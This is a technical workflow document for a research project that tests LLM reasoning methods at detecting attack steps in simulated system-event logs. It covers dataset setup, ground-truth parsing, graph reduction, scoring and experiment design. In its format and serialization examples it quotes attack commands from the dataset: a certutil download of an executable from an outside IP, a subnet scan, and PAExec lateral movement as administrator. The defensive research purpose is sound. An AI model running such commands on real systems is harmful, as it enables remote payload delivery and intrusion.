# workflow.md — End-to-End Technical Workflow

This document is written to be fed to an implementation agent (or followed directly). It describes the data flow, file structures, and the exact transformation at each step. Read `idea.md` and `phases.md` first for context.

---

## Dataset acquisition

**Repo:** https://github.com/PKU-ASAL/Simulated-Data

```bash
git clone https://github.com/PKU-ASAL/Simulated-Data.git
cd Simulated-Data
git lfs install
git lfs pull          # REQUIRED: Ubuntu + W10 zips are LFS pointers otherwise
```

**Structure after clone:**
```
Simulated-Data/
├── SimulatedWS12.zip      (83 MB, direct)
├── SimulatedUbuntu.zip    (~369 MB, LFS)
├── SimulatedW10.zip       (~134 MB, LFS)
└── doc/
    ├── SimulatedWS12-attack/
    │   ├── attack_annotation/   A1.txt ... A6.txt, A_alltime.txt
    │   └── attack_analysis.xls
    ├── SimulatedUbuntu-attack/  (8 nodes: A1..A8)
    └── SimulatedW10-attack/
        ├── APT29/       (attack_annotation/ ~37 nodes + attack_analysis.xls)
        ├── Sidewinder/  (~15 nodes)
        └── FIN6/        (~23 nodes)
```

**Unzip (note nested zips):**
```bash
unzip SimulatedWS12.zip           # → SimulatedWS12/hw20.zip
cd SimulatedWS12 && unzip hw20.zip # → benign.json (2.4GB) + anomaly.json (353MB)
```

---

## Data format reference

**`anomaly.json`** — JSONL, one event per line. ~1.09M events for WS12. Key event types (WS12 distribution):
- `FileIO/Read` (~77%) — NOISE, drop
- `FileIO/Write` (~12%) — mostly noise, keep suspicious paths
- `TcpIp/Recv`, `TcpIp/Send` — keep external IPs
- `Image/Load` — NOISE, drop
- `Process/Start` (~0.06%, ~285 events) — **KEEP ALL** — has PID, ParentID, ImageFileName, CommandLine
- `Process/Stop` — keep

**Timestamps:** `MSec` = milliseconds since trace start, NOT wall-clock. Ground truth uses wall-clock. Do NOT rely on time-alignment; match on **command-line substring** instead (robust).

**`attack_annotation/A*.txt`** format:
```
[occurTime]
2022-03-18 16:45:42.000
2022-03-18 16:46:23.000
[hostIp]
192.168.0.95
[pCommand]
taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\Users\Public\agent.exe & ...
```

**`attack_analysis.xls`** — maps annotation IDs → kill-chain stage + attack step narrative. Combined IDs use CJK comma `、` (split on it). Example mapping (Ubuntu):
- A1、A2、A3 → Initial access
- A5 → Credential theft
- A6、A7 → Lateral movement
- A4 → Persistence
- A8 → Privilege elevation

---

## The pipeline, step by step

### STEP 1 — Parse ground truth (answer key, held out)
```
INPUT:  attack_annotation/A*.txt + attack_analysis.xls
OUTPUT: ground_truth[scenario] = [
          {id: "A2", stage: "Initial access",
           match_substring: "sangforcat.exe",
           full_command: "certutil -urlcache ..."},
          ...
        ]
```
- Extract a distinctive `match_substring` per node (malware filename / target IP / tool name).
- NEVER feed ground_truth to the model. It is only for the scorer.

### STEP 2 — Construct evidence graph (from logs)
```
INPUT:  anomaly.json (stream line-by-line)
OUTPUT: process graph — nodes {PID, ParentID, image, cmdline, msec}
                         edges ParentID → PID; process → file; process → IP
```
- Build in memory. For WS12 ~285 Process/Start nodes is tiny; scales fine.

### STEP 3 — Reduce (noise removal + candidate selection)
```
INPUT:  full process graph
OUTPUT: candidate subgraph (~50-300 nodes)
```
Keep: all Process/Start (with cmdline), external network connections, suspicious file writes.
Drop: FileIO/Read, Image/Load, internal-only noise.

**HARD GATE:** assert every ground_truth match_substring appears in at least one candidate node's command line. If not, loosen the filter and repeat. Log which attack nodes survived. Do not proceed until 100% survive.

### STEP 4 — Serialize (graph → structured text)
```
INPUT:  candidate subgraph
OUTPUT: text block (~1.5K-8K tokens) preserving causality via indentation
```
Example:
```
[t=16:45] cmd.exe (PID 2428)
  └─ certutil (PID 3820): "certutil -urlcache -split -f http://124.223.85.207.../sangforcat.exe C:\Users\Public\agent.exe"
       └─ agent.exe (PID 4102): connected → 124.223.85.207:8079
  └─ nbtscan (PID 4510): "nbtscan.exe 192.168.0.244/24"
  └─ PAExec (PID 4780): "PAExec.exe \\192.168.0.244 -u administrator ..."
```
This text is the SHARED input to all three reasoning methods.

### STEP 5 — Reason (CoT / ToT / GoT) — THE ONLY VARIABLE
```
INPUT:  serialized candidate text + method + model
OUTPUT: {malicious_events: [{command, stage}], narrative: "...",
         _cost: {llm_calls, prompt_tokens, completion_tokens, wall_clock_s}}
```

**CoT** — 1 call:
> "Here are candidate events from a host. Reason step by step: which are malicious, and what kill-chain stage does each belong to? Output JSON: {malicious_events:[{command, stage}], narrative}."

**ToT** — many calls (Generate k → Evaluate → KeepBest b → recurse):
- Generate: propose k interpretations of ambiguous events.
- Evaluate: score each (sure/likely/impossible or 0-1).
- KeepBest: prune to top b.
- Recurse until events classified; emit best path as JSON.

**GoT** — most calls (Generate per-segment → Aggregate → Refine):
- Split candidate text into segments (time windows or process subtrees).
- Generate: reason over each segment independently → per-segment findings.
- **Aggregate:** one call merging all segment findings into a single ordered kill chain. THE KEY OPERATION.
- Refine: revise the merged chain given full context (self-loop).
- Score → KeepBest → emit JSON.

Implement all three via `spcl/graph-of-thoughts` Graph-of-Operations. Point its LLM backend at local Ollama/vLLM.

**Few-shot hygiene:** examples (if any) come from a DIFFERENT scenario (leave-one-scenario-out).

### STEP 6 — Score
```
INPUT:  model output + ground_truth[scenario]
OUTPUT: {precision, recall, f1,            # event-level
         stage_recall, stage_f1,           # stage-level
         hallucination_rate,               # invented IOCs
         cost: {calls, tokens, time}}      # efficiency
```
- Event match: flagged command contains a ground_truth match_substring → TP.
- Keep event-F1 and stage-recall separate. No composite score.

### STEP 7 — Grid + aggregate
```
FOR scenario IN [WS12, Ubuntu, APT29, Sidewinder, FIN6]:
  FOR method IN [CoT, ToT, GoT]:
    FOR model IN [llama3.1-8b, qwen2.5-7b, phi4]:
      FOR seed IN [1..N]:
        run STEP 5 → STEP 6, store result
```
Report per-scenario mean ± std. Build accuracy-vs-cost Pareto plot.

### STEP 8 — Aggregation ablation (novelty defense)
Run GoT WITHOUT the Aggregate op (just more independent Generates, pick best) vs. GoT WITH Aggregate. If WITH wins, the gain is aggregation — not extra sampling. This is the experiment that defends the core claim.

---

## Recommended repo layout for implementation
```
project/
├── data/                        # cloned dataset (gitignored)
├── src/
│   ├── parse_ground_truth.py    # STEP 1
│   ├── build_graph.py           # STEP 2-3 (constructor + reduction)
│   ├── serialize.py             # STEP 4
│   ├── methods/
│   │   ├── cot.py               # STEP 5
│   │   ├── tot.py
│   │   └── got.py
│   ├── scorer.py                # STEP 6  (BUILD & LOCK BEFORE methods/)
│   └── run_grid.py              # STEP 7-8
├── results/                     # metrics + raw outputs per grid cell
└── idea.md, phases.md, workflow.md
```

## Build order (critical)
1. `parse_ground_truth.py`  (STEP 1)
2. `build_graph.py` + `serialize.py` with the HARD GATE (STEP 2-4)
3. `scorer.py` + unit tests  (STEP 6) — **LOCK before writing any method**
4. `methods/cot.py` first (simplest), verify end-to-end on WS12
5. `methods/tot.py`, `methods/got.py`
6. `run_grid.py` (STEP 7), then ablation (STEP 8)

## The one invariant that must never break
STEPS 1-4 and 6 are IDENTICAL across all methods. Only STEP 5 changes. If CoT and GoT ever receive different candidate sets or different serialization, the experiment is invalid. Guard this.
